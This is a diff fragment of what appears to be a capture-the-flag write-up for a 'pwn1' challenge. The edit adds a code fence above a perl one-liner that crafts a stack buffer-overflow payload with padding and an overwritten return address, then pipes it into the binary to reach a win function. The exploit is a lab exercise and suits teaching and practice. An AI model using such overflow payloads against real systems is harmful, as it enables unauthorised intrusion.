@@ -477,6 +477,7 @@ $
 ```
 Hahahaha, less work to do, there's no need to build a ROP chain, all what we have to do is to jump to this function.
 ```
+```
 pwn1@MCSC2015:/challenges/pwn1$ perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApWm7PP\x00AAAA\xdf\x89\x04\x08"' > /tmp/input
 pwn1@MCSC2015:/challenges/pwn1$ cat /tmp/input -|./pwn1 whoami 
 You win
